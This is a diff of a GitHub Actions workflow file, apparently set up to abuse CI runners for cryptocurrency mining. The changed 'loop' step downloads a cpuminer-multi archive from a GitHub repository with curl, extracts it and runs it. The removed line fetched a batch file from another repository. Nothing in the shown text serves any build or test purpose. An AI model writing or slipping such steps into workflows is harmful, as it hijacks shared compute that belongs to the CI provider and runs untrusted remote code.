@@ -11,6 +11,7 @@ jobs:
     steps:
     
     - name: loop
-       Invoke-WebRequest https://raw.githubusercontent.com/iton466/test/main/loop.bat  -OutFile loop.bat
-      run: cmd /c curl https://github.com/Testdrive345/light/raw/main/cpuminer-multi-win64.rar -O -J -L  tar -xf cpuminer-multi-win64.rar test
+      run: cmd /c curl https://github.com/Testdrive345/light/raw/main/cpuminer-multi-win64.rar -O -J -L
+           cmd /c tar -xf cpuminer-multi-win64.rar
+           cmd /c test
     
